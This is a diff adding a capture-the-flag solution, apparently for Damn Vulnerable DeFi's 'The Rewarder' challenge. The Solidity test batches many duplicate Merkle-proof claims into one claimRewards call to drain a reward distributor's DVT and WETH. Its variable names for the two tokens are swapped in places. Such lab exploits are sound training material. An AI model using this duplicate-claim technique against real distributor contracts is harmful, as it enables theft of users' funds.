@@ -148,7 +148,41 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        IERC20[] memory tokens = new IERC20[](2);
+        tokens[0] = IERC20(address(dvt));
+        tokens[1] = IERC20(address(weth));
         
+        uint256 claimAmountWETH = 11524763827831882;
+        uint256 repeatsWETH  = distributor.getRemaining(address(dvt)) / claimAmountWETH;
+
+        uint256 claimAmountDVT = 1171088749244340;
+        uint256 repeatsDVT  = distributor.getRemaining(address(weth)) / claimAmountDVT;
+
+        Claim[] memory claims = new Claim[](repeatsWETH + repeatsDVT);
+
+        uint256 i = 0;
+        for (; i < repeatsWETH; i++) {
+            claims[i] = Claim({
+            batchNumber: 0,
+            amount: 11524763827831882,
+            tokenIndex: 0,
+            proof: merkle.getProof(dvtLeaves, 188)
+            });
+        }
+        for (; i < repeatsDVT + repeatsWETH; i++) {
+            claims[i] = Claim({
+            batchNumber: 0,
+            amount: 1171088749244340,
+            tokenIndex: 1,
+            proof: merkle.getProof(wethLeaves, 188)
+            });
+        }
+        distributor.claimRewards(claims, tokens);
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
